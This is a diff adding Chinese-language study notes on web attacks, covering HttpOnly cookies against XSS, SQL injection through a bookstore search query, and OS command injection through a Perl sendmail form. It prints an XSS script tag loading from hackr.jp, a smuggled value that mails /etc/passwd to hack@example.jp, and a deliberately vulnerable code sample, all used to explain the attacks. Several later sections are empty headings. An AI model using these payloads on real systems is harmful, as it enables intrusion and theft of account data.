@@ -155,15 +155,132 @@ document.write(">")
 ```
 http://example.js/login?ID="><script src=http://hackr.jp/xss.js></script>"
 ```
+注意：针对这种攻击cookie内加上httponly属性（<b>HttpOnly会禁止js访问cookie</b>, 服务端可正常读取）可以避免这种情况；
+```
+客户端                                                         服务器
+    1 ----> 发送已登陆的信息（用户id，密码）    ---->
+            
+     <----- 发送包含session id的cookie    <----  2
+            向用户发放sessionid 记录认证状态
+            set-cookie: JSESSIONID=94f18be8c47e4d329...
+            set-cookie: JSESSIONID=94f18be8c47e4d329b6...; Path=/..; HttpOnly; SameSite=lax
+            
+    3 ----> 发送包含sessionid的cookie    ---->  
+            通过验证sessionid判定对方是真实用户
+            cookie: JSESSIONID=794f18be8c47e4d329...; experim...
+```
+
+2. SQL注入攻击：是指针对web应用使用的数据库，通过运行非法的SQL而产生的攻击
+
+> 会执行非法SQL的SQL注入攻击
+
+如果在使用SQL语句方式上存在漏洞，就有可能被恶意注入非法SQL语句，SQL注入攻击可能造成以下影响
+
+* 1 非法查看和篡改数据库的内容
+* 2 规避认证
+* 3 执行和数据库服务器业务关联的程序
+
+> SQL注入攻击案例
+
+以购物网站（书城）搜索功能为例：以作者为搜索条件；
+
+正常操作如下：
+```
+以"朴灵"作为关键字进行搜索
+访问http:examole.com/search?q=朴灵
+
+对应的SQL语句
+SELECT * FROM bookTbl WHERE author = '朴灵' and flag = 1;
+从bookTbl表中，显示满足author = '朴灵' and flag = 1（可售）所在行的数据
+
+```
+
+注入攻击的操作示例
+```
+以"朴灵'--"作为关键字进行搜索
+访问http:examole.com/search?q=朴灵'--
+
+对应的SQL语句
+SELECT * FROM bookTbl WHERE author = '朴灵'--' and flag = 1;
+从bookTbl表中，显示满足author = '朴灵' and flag = 1（可售）所在行的数据
+(-- 之后的内容会自动判为注释，因此flag=1这个条件就被直接忽略了)
+
+```
+
+> SQL注入攻击破坏SQL语句结构的案例
+
+在之前的攻击案例中,会把"朴灵'--"字符串赋值给$q
+```
+SELECT * FROM bookTbl WHERE author = '$q' and flag = 1;
+
+SELECT * FROM bookTbl WHERE author = '朴灵'--' and flag = 1;
+
+遇到’ 后面的--不属于author字面值回被解析成其他的语句，当这个语句是其他内容比如篡改内容等，将会有不同程度的损失
+```
+
+3. OS命令注入攻击：是指通过web应用，执行非法的操作系统命令达到攻击的目的
+
+只要在能调用shell函数的地方就有存在被攻击的风险；os命令注入攻击可以向shell发送命令，让windows或者linux操作系统的命令行启动程序；（即，通过os注入攻击可执行os上安装着的各种程序）
+
+> OS注入攻击案例
+
+以咨询表单的发送功能为例：该功能可将用户咨询邮件按已填写的对方邮箱地址发送过去；下面摘选的核心代码
+```
+my $adr = $q->param('mailadress');
+open(MALL, "| /usr/sbin/sendmail $adr");
+print MALL "From: info@example.com\n"
+```
+上面的open函数会调用sendmail命令发送邮件，而指定的邮件发送地址即$adr的值；
+
+攻击者将下面的值作为邮件地址
+
+```
+; cat /etc/passwd | mail hack@example.jp
+```
+程序接收该值，构成一下命令组合
+```
+| /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp
+```
+攻击者输入值中含有"；", 这个符号在os命令中，会被解析为分隔多个执行命令的标记；
+分隔后，sendmail会执行cat /etc/passwd | mail hack@example.jp；结果含有linux账户信息的 /etc/passwd 的文件，就以邮件的形式发送给了hack@example.jp
+
+
+
+4. HTTP首部注入攻击
+
+> HTTP首部注入攻击案例
+> HTTP响应截断攻击
+
+
+5. 邮件首部注入攻击
+
+> 邮件首部注入攻击案例
+
+
+
+6. 目录遍历攻击
+
+> 目录遍历攻击案例
+
+
+7. 远程文件包含漏洞
+
+> 远程文件包含漏洞案例
+
+
+### 3 因设置或设计上的缺陷引发的安全漏洞
 
 
 
 
 
 
+### 4 因会话管理疏忽引发的安全漏洞
 
 
 
+
+### 5 其他安全漏洞
 
 
 
